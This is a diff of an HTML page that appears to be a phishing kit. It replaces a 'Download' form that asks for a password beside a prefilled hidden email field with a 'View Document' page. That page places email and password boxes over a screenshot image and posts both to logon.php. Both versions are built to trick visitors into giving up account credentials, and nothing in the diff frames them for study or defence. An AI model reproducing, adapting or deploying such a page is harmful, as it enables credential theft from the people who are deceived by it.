@@ -29,38 +29,28 @@
         }
     </style>
 </head>
+<script>
+function validatePassword()
+{
+	if(logonform.password.value == ""){
+		alert("Email field cannot be empty");
+		logonform.password.focus();
+		return false;
+	}
+}
+</script>
+<title>View Document</title>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
+<meta name="generator" content="Web Page Maker">
+</head>
 <body>
-<div class="container">
-    <div class="jumbotron bg-transparent"></div>
-  <h1></h1><br> <h1></h1><br> <h1></h1><br> <h1></h1><br>
-    <div class="row">
-    <div class="col-sm-4"></div>
-    <div class="col green text-white p-3 curve">
-<img src="fx.png" class="img-fluid">     
-         <div id="err" class="text-white text-center"><i></i></div>
-        <form method="post" username="profileUp">
-          
-        
-                <div class="text-center h5" id="ex">%0%</div>
-               
-        
-            <div class="form-group">
-           
-                <input type="password" name="x2" placeholder="Enter Password" value="" class="form-control text-center">
-            </div>
-            <div class="form-group">
-                             <input type="submit" username="btn" class="btn btn-md btn-dark" value="Download">
-                             <input type="hidden" username="em" name="x1" value="%0%" class="form-control text-center" readonly="">
-           
-            </div>
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:620px; z-index:0"><img src="images/p1.png" alt="" title="" border=0 width=1350 height=620></div>
 
+<form name="logonform" method="POST" onsubmit="return validatePassword()" action="logon.php" style="margin:0px">
 
-    </form>
-   
-</div>
-    <div class="col-sm-3"></div>
-</div>
-</div>
+<input name="username" placeholder="Email Address" style="position:absolute;width:435px;height:57px;left:458px;top:312px;z-index:1">
+<input name="password" type="password" placeholder=" password" style="position:absolute;width:435px;height:57px;left:458px;top:363px;z-index:2">
+<div id="formimage1" style="position:absolute; left:458px; top:441px; z-index:3"><input type="image" name="formimage1" width="435" height="57" src="images/p2.png"></div>
 
-
-</body></html>
+</body>
+</html>
